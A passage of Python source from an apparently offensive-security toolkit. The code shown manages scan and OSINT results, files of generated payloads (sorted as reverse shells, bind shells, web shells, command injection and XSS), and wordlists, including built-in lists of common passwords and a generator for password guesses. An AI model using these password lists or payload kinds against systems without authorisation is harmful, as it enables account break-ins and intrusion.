        ("3", "Export Results", "Export results to another format"),
        ("4", "Delete Results", "Delete selected results"),
        ("0", "Return", "Return to Settings")
    ]

    console.print(create_menu_table("Results Management", options))

    choice = get_integer_input("Select an option", 0, 4)

    if choice == 0:
        return
    elif choice == 1:
        view_results_by_type(sorted_types)
    elif choice == 2:
        search_results(results_files)
    elif choice == 3:
        export_results(results_files)
    elif choice == 4:
        delete_results(results_files)


def view_results_by_type(sorted_types):
    console.print(f"[bold {NordColors.FROST_2}]Result types:[/]")
    for i, (type_name, files) in enumerate(sorted_types, 1):
        console.print(f"  {i}. {type_name} ({len(files)} files)")

    type_choice = get_integer_input(f"Select type (1-{len(sorted_types)})", 1, len(sorted_types))
    if type_choice <= 0:
        return

    selected_type, files = sorted_types[type_choice - 1]

    # Sort files by date (newest first)
    files.sort(key=lambda x: x.stat().st_mtime, reverse=True)

    table = Table(
        title=f"{selected_type} Results",
        show_header=True,
        header_style=f"bold {NordColors.FROST_1}",
    )
    table.add_column("#", style=f"bold {NordColors.FROST_2}")
    table.add_column("Filename", style=NordColors.SNOW_STORM_1)
    table.add_column("Date", style=NordColors.FROST_3)
    table.add_column("Size", style=NordColors.FROST_4)

    for i, file in enumerate(files, 1):
        # Format date
        mtime = datetime.datetime.fromtimestamp(file.stat().st_mtime)
        date_str = mtime.strftime("%Y-%m-%d %H:%M:%S")

        # Format size
        size = file.stat().st_size
        if size < 1024:
            size_str = f"{size} B"
        elif size < 1024 * 1024:
            size_str = f"{size / 1024:.1f} KB"
        else:
            size_str = f"{size / (1024 * 1024):.1f} MB"

        table.add_row(str(i), file.name, date_str, size_str)

    console.print(table)

    file_choice = get_integer_input(f"Select file to view (1-{len(files)})", 1, len(files))
    if file_choice <= 0:
        return

    selected_file = files[file_choice - 1]
    view_file(selected_file)


def view_file(file_path):
    try:
        with open(file_path, "r") as f:
            content = f.read()

        if file_path.suffix == ".json":
            try:
                data = json.loads(content)
                formatted_json = json.dumps(data, indent=2)
                console.print(Syntax(formatted_json, "json", theme="nord"))
            except Exception:
                console.print(content)
        else:
            console.print(content)
    except Exception as e:
        print_error(f"Error reading file: {e}")


def search_results(results_files):
    search_term = get_user_input("Enter search term")
    if not search_term:
        return

    matching_files = []

    progress, task = display_progress(len(results_files), "Searching results", NordColors.FROST_2)

    with progress:
        for file in results_files:
            try:
                with open(file, "r") as f:
                    content = f.read()

                if search_term.lower() in content.lower() or search_term.lower() in file.name.lower():
                    matching_files.append(file)
            except Exception:
                pass
            finally:
                progress.update(task, advance=1)

    if not matching_files:
        display_panel(
            "Search Results",
            f"No results found for '{search_term}'",
            NordColors.YELLOW
        )
        return

    table = Table(
        title=f"Search Results for '{search_term}'",
        show_header=True,
        header_style=f"bold {NordColors.FROST_1}",
    )
    table.add_column("#", style=f"bold {NordColors.FROST_2}")
    table.add_column("Filename", style=NordColors.SNOW_STORM_1)
    table.add_column("Date", style=NordColors.FROST_3)

    for i, file in enumerate(matching_files, 1):
        # Format date
        mtime = datetime.datetime.fromtimestamp(file.stat().st_mtime)
        date_str = mtime.strftime("%Y-%m-%d %H:%M:%S")

        table.add_row(str(i), file.name, date_str)

    console.print(table)

    file_choice = get_integer_input(f"Select file to view (1-{len(matching_files)})", 1, len(matching_files))
    if file_choice <= 0:
        return

    selected_file = matching_files[file_choice - 1]
    view_file(selected_file)


def export_results(results_files):
    # Filter for JSON files only (they can be converted)
    json_files = [f for f in results_files if f.suffix == ".json"]

    if not json_files:
        display_panel(
            "Export Results",
            "No JSON results found to export.",
            NordColors.YELLOW
        )
        return

    table = Table(
        title="Exportable Results",
        show_header=True,
        header_style=f"bold {NordColors.FROST_1}",
    )
    table.add_column("#", style=f"bold {NordColors.FROST_2}")
    table.add_column("Filename", style=NordColors.SNOW_STORM_1)

    for i, file in enumerate(json_files, 1):
        table.add_row(str(i), file.name)

    console.print(table)

    file_choice = get_integer_input(f"Select file to export (1-{len(json_files)})", 1, len(json_files))
    if file_choice <= 0:
        return

    selected_file = json_files[file_choice - 1]

    console.print(f"[bold {NordColors.FROST_2}]Export formats:[/]")
    console.print("  1. CSV")
    console.print("  2. HTML report")
    console.print("  3. Plain text")

    format_choice = get_integer_input("Select format", 1, 3)
    if format_choice <= 0:
        return

    try:
        with open(selected_file, "r") as f:
            data = json.load(f)

        if format_choice == 1:
            export_to_csv(data, selected_file)
        elif format_choice == 2:
            export_to_html(data, selected_file)
        else:
            export_to_text(data, selected_file)
    except Exception as e:
        print_error(f"Export failed: {e}")


def export_to_csv(data, source_file):
    # Create export directory if it doesn't exist
    export_dir = RESULTS_DIR / "exports"
    export_dir.mkdir(exist_ok=True)

    output_file = export_dir / f"{source_file.stem}.csv"

    try:
        # Flatten nested JSON to CSV-friendly format
        flat_data = []

        if isinstance(data, dict):
            # Handle common result types
            if "port_data" in data:
                # Handle scan results
                for port, info in data["port_data"].items():
                    row = {"port": port}
                    row.update(info)
                    flat_data.append(row)
            elif "data" in data and isinstance(data["data"], dict):
                # Handle OSINT results
                for category, items in data["data"].items():
                    if isinstance(items, dict):
                        for key, value in items.items():
                            flat_data.append({"category": category, "key": key, "value": str(value)})
                    elif isinstance(items, list):
                        for item in items:
                            if isinstance(item, dict):
                                row = {"category": category}
                                row.update({k: str(v) for k, v in item.items()})
                                flat_data.append(row)
                            else:
                                flat_data.append({"category": category, "value": str(item)})
            else:
                # Generic handling
                flat_data.append({k: str(v) if isinstance(v, (dict, list)) else v for k, v in data.items()})
        elif isinstance(data, list):
            for item in data:
                if isinstance(item, dict):
                    flat_data.append({k: str(v) if isinstance(v, (dict, list)) else v for k, v in item.items()})
                else:
                    flat_data.append({"value": str(item)})

        if not flat_data:
            flat_data = [{"data": str(data)}]

        # Write CSV
        import csv
        with open(output_file, "w", newline="") as f:
            if flat_data:
                writer = csv.DictWriter(f, fieldnames=flat_data[0].keys())
                writer.writeheader()
                writer.writerows(flat_data)

        print_success(f"Data exported to {output_file}")
    except Exception as e:
        print_error(f"CSV export failed: {e}")


def export_to_html(data, source_file):
    # Create export directory if it doesn't exist
    export_dir = RESULTS_DIR / "exports"
    export_dir.mkdir(exist_ok=True)

    output_file = export_dir / f"{source_file.stem}.html"

    try:
        # Create a simple HTML report
        html = f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Report: {source_file.stem}</title>
    <style>
        body {{ font-family: Arial, sans-serif; margin: 20px; }}
        h1 {{ color: #5E81AC; }}
        h2 {{ color: #81A1C1; }}
        table {{ border-collapse: collapse; width: 100%; margin-bottom: 20px; }}
        th, td {{ padding: 8px; text-align: left; border: 1px solid #ddd; }}
        th {{ background-color: #E5E9F0; }}
        tr:nth-child(even) {{ background-color: #f9f9f9; }}
        .timestamp {{ color: #4C566A; font-style: italic; }}
        pre {{ background-color: #f8f8f8; padding: 10px; overflow: auto; }}
    </style>
</head>
<body>
    <h1>Report: {source_file.stem}</h1>
    <p class="timestamp">Generated: {datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")}</p>
"""

        # Add report content based on data type
        if isinstance(data, dict):
            # Check for common result types
            if "target" in data:
                html += f"<h2>Target: {data['target']}</h2>\n"

            if "timestamp" in data:
                try:
                    timestamp = datetime.datetime.fromisoformat(data["timestamp"])
                    html += f"<p>Scan Time: {timestamp.strftime('%Y-%m-%d %H:%M:%S')}</p>\n"
                except Exception:
                    html += f"<p>Timestamp: {data['timestamp']}</p>\n"

            if "port_data" in data:
                html += "<h2>Port Scan Results</h2>\n"
                html += "<table>\n<tr><th>Port</th><th>Service</th><th>State</th></tr>\n"

                for port, info in data["port_data"].items():
                    service = info.get("service", "unknown")
                    state = info.get("state", "unknown")
                    html += f"<tr><td>{port}</td><td>{service}</td><td>{state}</td></tr>\n"

                html += "</table>\n"

            if "vulnerabilities" in data and data["vulnerabilities"]:
                html += "<h2>Vulnerabilities</h2>\n"
                html += "<table>\n<tr><th>Type</th><th>Description</th></tr>\n"

                for vuln in data["vulnerabilities"]:
                    vuln_type = vuln.get("type", "Unknown")
                    description = vuln.get("description", "No description")
                    html += f"<tr><td>{vuln_type}</td><td>{description}</td></tr>\n"

                html += "</table>\n"

            if "data" in data and isinstance(data["data"], dict):
                html += "<h2>Intelligence Data</h2>\n"

                for category, items in data["data"].items():
                    html += f"<h3>{category.capitalize()}</h3>\n"

                    if isinstance(items, dict):
                        html += "<table>\n<tr><th>Property</th><th>Value</th></tr>\n"
                        for key, value in items.items():
                            if isinstance(value, list):
                                value = ", ".join(str(v) for v in value)
                            html += f"<tr><td>{key}</td><td>{value}</td></tr>\n"
                        html += "</table>\n"
                    elif isinstance(items, list):
                        html += "<ul>\n"
                        for item in items:
                            html += f"<li>{item}</li>\n"
                        html += "</ul>\n"

            # Add remaining data as JSON
            other_data = {k: v for k, v in data.items()
                          if k not in ["target", "timestamp", "port_data", "vulnerabilities", "data"]}

            if other_data:
                html += "<h2>Additional Data</h2>\n"
                html += f"<pre>{json.dumps(other_data, indent=2)}</pre>\n"
        else:
            # Generic JSON display
            html += "<h2>Data</h2>\n"
            html += f"<pre>{json.dumps(data, indent=2)}</pre>\n"

        html += """</body>
</html>"""

        with open(output_file, "w") as f:
            f.write(html)

        print_success(f"Report exported to {output_file}")
    except Exception as e:
        print_error(f"HTML export failed: {e}")


def export_to_text(data, source_file):
    export_dir = RESULTS_DIR / "exports"
    export_dir.mkdir(exist_ok=True)

    output_file = export_dir / f"{source_file.stem}.txt"

    try:
        with open(output_file, "w") as f:
            f.write(f"Report: {source_file.stem}\n")
            f.write(f"Generated: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")

            if isinstance(data, dict):
                for key, value in data.items():
                    f.write(f"{key.upper()}:\n")
                    if isinstance(value, dict):
                        for k, v in value.items():
                            f.write(f"  {k}: {v}\n")
                    elif isinstance(value, list):
                        for item in value:
                            if isinstance(item, dict):
                                for k, v in item.items():
                                    f.write(f"  {k}: {v}\n")
                                f.write("\n")
                            else:
                                f.write(f"  {item}\n")
                    else:
                        f.write(f"  {value}\n")
                    f.write("\n")
            else:
                f.write(str(data))

        print_success(f"Data exported to {output_file}")
    except Exception as e:
        print_error(f"Text export failed: {e}")


def delete_results(results_files):
    table = Table(
        title="All Results",
        show_header=True,
        header_style=f"bold {NordColors.FROST_1}",
    )
    table.add_column("#", style=f"bold {NordColors.FROST_2}")
    table.add_column("Filename", style=NordColors.SNOW_STORM_1)
    table.add_column("Type", style=NordColors.FROST_3)
    table.add_column("Date", style=NordColors.FROST_4)

    for i, file in enumerate(results_files, 1):
        # Format date
        mtime = datetime.datetime.fromtimestamp(file.stat().st_mtime)
        date_str = mtime.strftime("%Y-%m-%d %H:%M:%S")

        # Determine type
        file_type = file.name.split('_')[0]

        table.add_row(str(i), file.name, file_type, date_str)

    console.print(table)

    console.print(f"[bold {NordColors.FROST_2}]Delete options:[/]")
    console.print("  1. Delete specific files")
    console.print("  2. Delete by type")
    console.print("  3. Delete all results")
    console.print("  0. Cancel")

    delete_option = get_integer_input("Select option", 0, 3)

    if delete_option == 0:
        return
    elif delete_option == 1:
        file_selection = get_user_input("Enter file numbers to delete (comma-separated, e.g. 1,3,5)")

        try:
            selected_indices = [int(i.strip()) - 1 for i in file_selection.split(",")]
            files_to_delete = [results_files[i] for i in selected_indices if 0 <= i < len(results_files)]

            if not files_to_delete:
                print_error("No valid files selected")
                return

            if get_confirmation(f"Delete {len(files_to_delete)} files? This cannot be undone."):
                for file in files_to_delete:
                    file.unlink()
                print_success(f"Deleted {len(files_to_delete)} files")
        except ValueError:
            print_error("Invalid selection")
    elif delete_option == 2:
        # Group by type
        result_types = {}
        for file in results_files:
            prefix = file.name.split('_')[0]
            if prefix not in result_types:
                result_types[prefix] = []
            result_types[prefix].append(file)

        console.print(f"[bold {NordColors.FROST_2}]Result types:[/]")
        for i, (type_name, files) in enumerate(result_types.items(), 1):
            console.print(f"  {i}. {type_name} ({len(files)} files)")

        type_choice = get_integer_input(f"Select type to delete (1-{len(result_types)})", 1, len(result_types))
        if type_choice <= 0:
            return

        selected_type = list(result_types.keys())[type_choice - 1]
        files_to_delete = result_types[selected_type]

        if get_confirmation(f"Delete all {len(files_to_delete)} {selected_type} files? This cannot be undone."):
            for file in files_to_delete:
                file.unlink()
            print_success(f"Deleted {len(files_to_delete)} files")
    elif delete_option == 3:
        if get_confirmation(f"Delete ALL {len(results_files)} result files? This CANNOT be undone."):
            if get_confirmation("Are you REALLY sure? ALL results will be lost."):
                for file in results_files:
                    file.unlink()
                print_success(f"Deleted all {len(results_files)} files")


def manage_payloads():
    payload_files = list(PAYLOADS_DIR.glob("*.*"))

    if not payload_files:
        display_panel(
            "Payload Management",
            "No payloads found. Generate some payloads first.",
            NordColors.YELLOW
        )
        return

    # Group payloads by type
    payload_types = {}
    for file in payload_files:
        # Try to determine payload type from filename
        prefix = "unknown"
        for pt in ["reverse_shell", "bind_shell", "web_shell", "cmd_injection", "xss", "password"]:
            if pt in file.name:
                prefix = pt
                break

        if prefix not in payload_types:
            payload_types[prefix] = []
        payload_types[prefix].append(file)

    options = [
        ("1", "View Payloads", "Browse and view payload files"),
        ("2", "Export Payloads", "Export payloads to another location"),
        ("3", "Delete Payloads", "Delete selected payloads"),
        ("0", "Return", "Return to Settings")
    ]

    console.print(create_menu_table("Payload Management", options))

    choice = get_integer_input("Select an option", 0, 3)

    if choice == 0:
        return
    elif choice == 1:
        view_payloads(payload_types)
    elif choice == 2:
        export_payloads(payload_files)
    elif choice == 3:
        delete_payloads(payload_files)


def view_payloads(payload_types):
    console.print(f"[bold {NordColors.FROST_2}]Payload types:[/]")
    for i, (type_name, files) in enumerate(payload_types.items(), 1):
        console.print(f"  {i}. {type_name} ({len(files)} files)")

    type_choice = get_integer_input(f"Select type (1-{len(payload_types)})", 1, len(payload_types))
    if type_choice <= 0:
        return

    selected_type = list(payload_types.keys())[type_choice - 1]
    files = payload_types[selected_type]

    table = Table(
        title=f"{selected_type} Payloads",
        show_header=True,
        header_style=f"bold {NordColors.FROST_1}",
    )
    table.add_column("#", style=f"bold {NordColors.FROST_2}")
    table.add_column("Filename", style=NordColors.SNOW_STORM_1)
    table.add_column("Size", style=NordColors.FROST_3)

    for i, file in enumerate(files, 1):
        # Format size
        size = file.stat().st_size
        if size < 1024:
            size_str = f"{size} B"
        elif size < 1024 * 1024:
            size_str = f"{size / 1024:.1f} KB"
        else:
            size_str = f"{size / (1024 * 1024):.1f} MB"

        table.add_row(str(i), file.name, size_str)

    console.print(table)

    file_choice = get_integer_input(f"Select file to view (1-{len(files)})", 1, len(files))
    if file_choice <= 0:
        return

    selected_file = files[file_choice - 1]

    try:
        with open(selected_file, "r") as f:
            content = f.read()

        # Try to determine language for syntax highlighting
        language = "text"
        if selected_file.suffix == ".py":
            language = "python"
        elif selected_file.suffix == ".sh":
            language = "bash"
        elif selected_file.suffix == ".php":
            language = "php"
        elif selected_file.suffix == ".html" or selected_file.suffix == ".aspx":
            language = "html"
        elif selected_file.suffix == ".js":
            language = "javascript"
        elif selected_file.suffix == ".ps1":
            language = "powershell"
        elif selected_file.suffix == ".json":
            language = "json"

        console.print(Syntax(content, language, theme="nord"))

        if get_confirmation("Copy to clipboard?"):
            try:
                subprocess.run("pbcopy", input=content.encode(), check=True)
                print_success("Copied to clipboard")
            except Exception as e:
                print_error(f"Failed to copy: {e}")
    except Exception as e:
        print_error(f"Error reading file: {e}")


def export_payloads(payload_files):
    table = Table(
        title="Available Payloads",
        show_header=True,
        header_style=f"bold {NordColors.FROST_1}",
    )
    table.add_column("#", style=f"bold {NordColors.FROST_2}")
    table.add_column("Filename", style=NordColors.SNOW_STORM_1)
    table.add_column("Type", style=NordColors.FROST_3)

    for i, file in enumerate(payload_files, 1):
        # Determine type
        file_type = "Unknown"
        for pt in ["reverse_shell", "bind_shell", "web_shell", "cmd_injection", "xss", "password"]:
            if pt in file.name:
                file_type = pt.replace("_", " ").title()
                break

        table.add_row(str(i), file.name, file_type)

    console.print(table)

    console.print(f"[bold {NordColors.FROST_2}]Export options:[/]")
    console.print("  1. Export specific files")
    console.print("  2. Export all files")
    console.print("  0. Cancel")

    export_option = get_integer_input("Select option", 0, 2)

    if export_option == 0:
        return

    # Get export location
    export_path = get_user_input("Enter export directory")
    if not export_path:
        export_path = str(Path.home() / "Downloads" / "payloads")

    export_dir = Path(export_path)

    try:
        export_dir.mkdir(parents=True, exist_ok=True)
    except Exception as e:
        print_error(f"Failed to create export directory: {e}")
        return

    files_to_export = []

    if export_option == 1:
        file_selection = get_user_input("Enter file numbers to export (comma-separated, e.g. 1,3,5)")

        try:
            selected_indices = [int(i.strip()) - 1 for i in file_selection.split(",")]
            files_to_export = [payload_files[i] for i in selected_indices if 0 <= i < len(payload_files)]

            if not files_to_export:
                print_error("No valid files selected")
                return
        except ValueError:
            print_error("Invalid selection")
            return
    else:
        files_to_export = payload_files

    # Export files
    exported_count = 0
    for file in files_to_export:
        try:
            shutil.copy2(file, export_dir / file.name)
            exported_count += 1
        except Exception as e:
            print_error(f"Failed to export {file.name}: {e}")

    if exported_count > 0:
        print_success(f"Exported {exported_count} files to {export_dir}")
    else:
        print_error("No files were exported")


def delete_payloads(payload_files):
    table = Table(
        title="All Payloads",
        show_header=True,
        header_style=f"bold {NordColors.FROST_1}",
    )
    table.add_column("#", style=f"bold {NordColors.FROST_2}")
    table.add_column("Filename", style=NordColors.SNOW_STORM_1)
    table.add_column("Type", style=NordColors.FROST_3)

    for i, file in enumerate(payload_files, 1):
        # Determine type
        file_type = "Unknown"
        for pt in ["reverse_shell", "bind_shell", "web_shell", "cmd_injection", "xss", "password"]:
            if pt in file.name:
                file_type = pt.replace("_", " ").title()
                break

        table.add_row(str(i), file.name, file_type)

    console.print(table)

    console.print(f"[bold {NordColors.FROST_2}]Delete options:[/]")
    console.print("  1. Delete specific files")
    console.print("  2. Delete all files")
    console.print("  0. Cancel")

    delete_option = get_integer_input("Select option", 0, 2)

    if delete_option == 0:
        return

    if delete_option == 1:
        file_selection = get_user_input("Enter file numbers to delete (comma-separated, e.g. 1,3,5)")

        try:
            selected_indices = [int(i.strip()) - 1 for i in file_selection.split(",")]
            files_to_delete = [payload_files[i] for i in selected_indices if 0 <= i < len(payload_files)]

            if not files_to_delete:
                print_error("No valid files selected")
                return

            if get_confirmation(f"Delete {len(files_to_delete)} files? This cannot be undone."):
                for file in files_to_delete:
                    file.unlink()
                print_success(f"Deleted {len(files_to_delete)} files")
        except ValueError:
            print_error("Invalid selection")
    else:
        if get_confirmation(f"Delete ALL {len(payload_files)} payload files? This CANNOT be undone."):
            if get_confirmation("Are you REALLY sure? ALL payloads will be lost."):
                for file in payload_files:
                    file.unlink()
                print_success(f"Deleted all {len(payload_files)} files")


def manage_wordlists():
    wordlist_files = list(WORDLISTS_DIR.glob("*.txt"))

    default_wordlists = {
        "web_dirs.txt": ["admin", "login", "wp-admin", "dashboard", "images", "uploads"],
        "passwords.txt": ["password123", "admin", "12345678", "qwerty", "letmein"],
        "subdomains.txt": ["www", "mail", "admin", "webmail", "dev", "test"]
    }

    # Create default wordlists if they don't exist
    for filename, words in default_wordlists.items():
        wordlist_path = WORDLISTS_DIR / filename
        if not wordlist_path.exists():
            try:
                with open(wordlist_path, "w") as f:
                    f.write("\n".join(words))
                wordlist_files.append(wordlist_path)
            except Exception:
                pass

    options = [
        ("1", "View Wordlists", "Browse and view wordlist files"),
        ("2", "Create Wordlist", "Create a new wordlist"),
        ("3", "Edit Wordlist", "Modify an existing wordlist"),
        ("4", "Import Wordlist", "Import wordlist from another location"),
        ("0", "Return", "Return to Settings")
    ]

    console.print(create_menu_table("Wordlist Management", options))

    choice = get_integer_input("Select an option", 0, 4)

    if choice == 0:
        return
    elif choice == 1:
        view_wordlists(wordlist_files)
    elif choice == 2:
        create_wordlist()
    elif choice == 3:
        edit_wordlist(wordlist_files)
    elif choice == 4:
        import_wordlist()


def view_wordlists(wordlist_files):
    if not wordlist_files:
        display_panel(
            "Wordlists",
            "No wordlists found.",
            NordColors.YELLOW
        )
        return

    table = Table(
        title="Available Wordlists",
        show_header=True,
        header_style=f"bold {NordColors.FROST_1}",
    )
    table.add_column("#", style=f"bold {NordColors.FROST_2}")
    table.add_column("Filename", style=NordColors.SNOW_STORM_1)
    table.add_column("Words", style=NordColors.FROST_3)
    table.add_column("Size", style=NordColors.FROST_4)

    for i, file in enumerate(wordlist_files, 1):
        # Count words
        try:
            with open(file, "r") as f:
                word_count = sum(1 for line in f if line.strip())
        except Exception:
            word_count = 0

        # Format size
        size = file.stat().st_size
        if size < 1024:
            size_str = f"{size} B"
        elif size < 1024 * 1024:
            size_str = f"{size / 1024:.1f} KB"
        else:
            size_str = f"{size / (1024 * 1024):.1f} MB"

        table.add_row(str(i), file.name, str(word_count), size_str)

    console.print(table)

    file_choice = get_integer_input(f"Select wordlist to view (1-{len(wordlist_files)})", 1, len(wordlist_files))
    if file_choice <= 0:
        return

    selected_file = wordlist_files[file_choice - 1]

    try:
        with open(selected_file, "r") as f:
            words = [line.strip() for line in f if line.strip()]

        preview_count = min(20, len(words))

        preview_table = Table(
            title=f"Wordlist Preview: {selected_file.name} ({len(words)} words)",
            show_header=True,
            header_style=f"bold {NordColors.FROST_1}",
        )
        preview_table.add_column("Word", style=NordColors.SNOW_STORM_1)

        for word in words[:preview_count]:
            preview_table.add_row(word)

        console.print(preview_table)

        if len(words) > preview_count:
            console.print(f"[bold {NordColors.YELLOW}]Showing first {preview_count} of {len(words)} words[/]")
    except Exception as e:
        print_error(f"Error reading wordlist: {e}")


def create_wordlist():
    name = get_user_input("Enter wordlist name (without .txt extension)")
    if not name:
        return

    if not name.endswith(".txt"):
        name += ".txt"

    wordlist_path = WORDLISTS_DIR / name

    if wordlist_path.exists():
        if not get_confirmation(f"Wordlist {name} already exists. Overwrite?"):
            return

    console.print(f"[bold {NordColors.FROST_2}]Add words options:[/]")
    console.print("  1. Enter words manually")
    console.print("  2. Generate words based on pattern")
    console.print("  3. Combine existing wordlists")

    option = get_integer_input("Select option", 1, 3)

    words = []

    if option == 1:
        console.print(f"[bold {NordColors.FROST_2}]Enter words (one per line, empty line to finish):[/]")

        while True:
            word = get_user_input("")
            if not word:
                break
            words.append(word)
    elif option == 2:
        pattern_type = get_integer_input(
            "Select pattern type: 1) Name variations, 2) Number sequences, 3) Common passwords", 1, 3
        )

        if pattern_type == 1:
            names = get_user_input("Enter base names (comma-separated)")
            if names:
                name_list = [name.strip() for name in names.split(",")]

                for name in name_list:
                    words.extend([
                        name.lower(),
                        name.upper(),
                        name.capitalize(),
                        f"{name}123",
                        f"{name}2023",
                        f"{name}2024",
                        f"{name}!",
                        f"{name.capitalize()}123"
                    ])
        elif pattern_type == 2:
            prefix = get_user_input("Enter prefix (optional)")
            start = get_integer_input("Start number", 0, 10000)
            end = get_integer_input("End number", start, 10000)

            if end < start:
                end = start + 100

            digits = len(str(end))

            for num in range(start, end + 1):
                if prefix:
                    words.append(f"{prefix}{num:0{digits}d}")
                else:
                    words.append(f"{num:0{digits}d}")
        elif pattern_type == 3:
            # Generate common password variations
            base_words = ["password", "admin", "user", "login", "welcome", "123", "qwerty"]

            for word in base_words:
                words.extend([
                    word,
                    f"{word}123",
                    f"{word}!",
                    f"{word}2023",
                    f"{word}2024",
                    word.capitalize(),
                    word.upper()
                ])

            # Add common number sequences
            for year in range(1990, 2025):
                words.append(str(year))

            # Add common keyboard patterns
            words.extend([
                "qwerty", "qwerty123", "qwertyuiop",
                "asdfgh", "asdfghjkl",
                "zxcvbn", "zxcvbnm"
            ])
    elif option == 3:
        existing_wordlists = list(WORDLISTS_DIR.glob("*.txt"))

        if not existing_wordlists:
            print_error("No existing wordlists found")
            return

        table = Table(
            title="Available Wordlists",
            show_header=True,
            header_style=f"bold {NordColors.FROST_1}",
        )
        table.add_column("#", style=f"bold {NordColors.FROST_2}")
        table.add_column("Filename", style=NordColors.SNOW_STORM_1)

        for i, file in enumerate(existing_wordlists, 1):
            table.add_row(str(i), file.name)

        console.print(table)

        selection = get_user_input("Enter wordlist numbers to combine (comma-separated)")

        try:
            selected_indices = [int(i.strip()) - 1 for i in selection.split(",")]
            selected_files = [existing_wordlists[i] for i in selected_indices if 0 <= i < len(existing_wordlists)]

            if not selected_files:
                print_error("No valid wordlists selected")
                return

            for file in selected_files:
                try:
                    with open(file, "r") as f:
                        words.extend([line.strip() for line in f if line.strip()])
                except Exception as e:
                    print_error(f"Error reading {file.name}: {e}")
        except ValueError:
            print_error("Invalid selection")
            return

    # Remove duplicates and sort
    words = sorted(set(words))

    if not words:
        print_error("No words added to wordlist")
        return

    # Save wordlist
    try:
        with open(wordlist_path, "w") as f:
            f.write("\n".join(words))

        print_success(f"Created wordlist {name} with {len(words)} words")
    except Exception as e:
        print_error(f"Error saving wordlist: {e}")


def edit_wordlist(wordlist_files):
    if not wordlist_files:
        display_panel(
            "Edit Wordlist",
            "No wordlists found. Create one first.",
            NordColors.YELLOW
        )
        return

    table = Table(
        title="Available Wordlists",
        show_header=True,
        header_style=f"bold {NordColors.FROST_1}",
    )
    table.add_column("#", style=f"bold {NordColors.FROST_2}")
    table.add_column("Filename", style=NordColors.SNOW_STORM_1)
    table.add_column("Words", style=NordColors.FROST_3)

    for i, file in enumerate(wordlist_files, 1):
        # Count words
        try:
            with open(file, "r") as f:
                word_count = sum(1 for line in f if line.strip())
        except Exception:
            word_count = 0

        table.add_row(str(i), file.name, str(word_count))

    console.print(table)

    file_choice = get_integer_input(f"Select wordlist to edit (1-{len(wordlist_files)})", 1, len(wordlist_files))
    if file_choice <= 0:
        return

    selected_file = wordlist_files[file_choice - 1]

    try:
        with open(selected_file, "r") as f:
            words = [line.strip() for line in f if line.strip()]

        console.print(f"[bold {NordColors.FROST_2}]Edit options:[/]")
        console.print("  1. Add words")
        console.print("  2. Remove words")
        console.print("  3. Clear wordlist")
        console.print("  0. Cancel")

        edit_option = get_integer_input("Select option", 0, 3)

        if edit_option == 0:
            return
        elif edit_option == 1:
            console.print(f"[bold {NordColors.FROST_2}]Enter words to add (one per line, empty line to finish):[/]")

            new_words = []
            while True:
                word = get_user_input("")
                if not word:
                    break
                new_words.append(word)

            if new_words:
                words.extend(new_words)
                words = sorted(set(words))  # Remove duplicates and sort

                with open(selected_file, "w") as f:
                    f.write("\n".join(words))

                print_success(f"Added {len(new_words)} words to {selected_file.name}")
            else:
                print_warning("No words added")
        elif edit_option == 2:
            console.print(f"[bold {NordColors.FROST_2}]Enter words to remove (one per line, empty line to finish):[/]")

            remove_words = []
            while True:
                word = get_user_input("")
                if not word:
                    break
                remove_words.append(word)

            if remove_words:
                original_count = len(words)
                words = [w for w in words if w not in remove_words]

                with open(selected_file, "w") as f:
                    f.write("\n".join(words))

                print_success(f"Removed {original_count - len(words)} words from {selected_file.name}")
            else:
                print_warning("No words removed")
        elif edit_option == 3:
            if get_confirmation(f"Clear all words from {selected_file.name}? This cannot be undone."):
                with open(selected_file, "w") as f:
                    f.write("")

                print_success(f"Cleared all words from {selected_file.name}")
    except Exception as e:
        print_error(f"Error editing wordlist: {e}")


def import_wordlist():
    source_path = get_user_input("Enter path to wordlist file")
    if not source_path:
        return

    source_file = Path(source_path)

    if not source_file.exists():
        print_error(f"File not found: {source_path}")
        return

    if not source_file.is_file():
        print_error(f"Not a file: {source_path}")
        return

    target_name = get_user_input("Enter name for imported wordlist (or leave blank to use source filename)")
    if not target_name:
        target_name = source_file.name

    if not target_name.endswith(".txt"):
        target_name += ".txt"

    target_path = WORDLISTS_DIR / target_name

    if target_path.exists():
        if not get_confirmation(f"Wordlist {target_name} already exists. Overwrite?"):
            return

    try:
        shutil.copy2(source_file, target_path)

        # Count words
        with open(target_path, "r") as f:
            word_count = sum(1 for line in f if line.strip())

        print_success(f"Imported wordlist {target_name} with {word_count} words")
    except Exception as e:
        print_error(f"Error importing wordlist: {e}")


def system_information():
    # Collect system information
    system_info = {
        "Hostname": socket.gethostname(),
        "macOS Version": platform.mac_ver()[0],
        "Kernel Version": platform.release(),
        "Architecture": platform.machine(),
        "Processor": platform.processor(),
        "Python Version": platform.python_version(),
        "User": os.environ.get("USER", "Unknown"),
        "Home Directory": str(Path.home()),
        "Toolkit Version": VERSION,
        "Toolkit Directory": str(BASE_DIR)
    }

    # Get network interfaces
    network_interfaces = {}
    try:
        import netifaces
        for iface in netifaces.interfaces():
            addresses = netifaces.ifaddresses(iface)
            if netifaces.AF_INET in addresses:
                for addr in addresses[netifaces.AF_INET]:
                    network_interfaces[iface] = addr.get('addr')
    except ImportError:
        # Fallback if netifaces is not available
        try:
            output = subprocess.check_output(["ifconfig"]).decode()
            for line in output.splitlines():
                if "inet " in line and "127.0.0.1" not in line:
                    parts = line.strip().split()
                    iface = parts[0]
                    ip = parts[1]
                    network_interfaces[iface] = ip
        except Exception:
            network_interfaces["eth0"] = "Could not determine"

    # Get disk usage
    disk_usage = {}
    try:
        usage = shutil.disk_usage("/")
        disk_usage["Total"] = f"{usage.total / (1024 ** 3):.1f} GB"
        disk_usage["Used"] = f"{usage.used / (1024 ** 3):.1f} GB"
        disk_usage["Free"] = f"{usage.free / (1024 ** 3):.1f} GB"
        disk_usage["Percent Used"] = f"{usage.used / usage.total * 100:.1f}%"
    except Exception:
        disk_usage["Status"] = "Could not determine"

    # Display system information
    console.print()
    system_table = Table(
        title="System Information",
        show_header=True,
        header_style=f"bold {NordColors.FROST_1}",
    )
    system_table.add_column("Property", style=f"bold {NordColors.FROST_2}")
    system_table.add_column("Value", style=NordColors.SNOW_STORM_1)

    for key, value in system_info.items():
        system_table.add_row(key, str(value))

    console.print(system_table)

    # Display network interfaces
    if network_interfaces:
        network_table = Table(
